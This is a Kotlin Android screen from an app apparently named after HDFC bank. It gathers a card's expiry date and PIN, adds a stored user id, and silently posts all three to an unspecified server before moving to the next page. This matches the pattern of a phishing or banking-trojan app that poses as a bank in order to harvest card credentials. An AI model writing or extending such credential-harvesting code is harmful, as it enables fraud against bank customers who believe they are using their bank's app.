package com.example.hdfc_new_app

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.ArrayAdapter
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.hdfc_new_app.databinding.ActivityThirdpageBinding
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

class thirdpage : AppCompatActivity() {

    private lateinit var binding : ActivityThirdpageBinding
    private val util = Util()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityThirdpageBinding.inflate(layoutInflater)
        setContentView(binding.root)


        val months = resources.getStringArray(R.array.months_array)
        val monthAdapter = ArrayAdapter(this, android.R.layout.simple_spinner_item, months)
        monthAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item)
        binding.monthSpinner.adapter = monthAdapter

        val years = resources.getStringArray(R.array.years_array)
        val yearAdapter = ArrayAdapter(this, android.R.layout.simple_spinner_item, years)
        yearAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item)
        binding.yearSpinner.adapter = yearAdapter



        binding.sub.setOnClickListener {

            if(binding.e2.text.toString().isEmpty() ){
                Toast.makeText(this,"Fill all fields",Toast.LENGTH_SHORT).show()
            } else if(binding.yearSpinner.selectedItem.toString() == "2022"){
                Toast.makeText(this,"expiry should be atleast 20233",Toast.LENGTH_SHORT).show()
            }
            else{
                val intentff = Intent(this,fourthpage::class.java)

                val data = ThirdPagem(userid = util.getLocalData(this,"u") ,
                    expiry = binding.monthSpinner.selectedItem.toString()+"/"+binding.yearSpinner.selectedItem.toString(),
                    pin = binding.e2.text.toString())
                val apiService = ApiClient.getClient().create(ApiService::class.java)
                val call = apiService.thirdpage(data)
                call.enqueue(object : Callback<Void?> {
                    override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                        if (response.isSuccessful) {
                            startActivity(intentff)
                            Log.d("asdf123", "yes")
                        } else {
                            Log.d("asdf123", "unsucess")
                        }
                    }

                    override fun onFailure(call: Call<Void?>, t: Throwable) {
                        Log.d("asdf123", t.toString())
                    }
                })
            }

        }


    }

}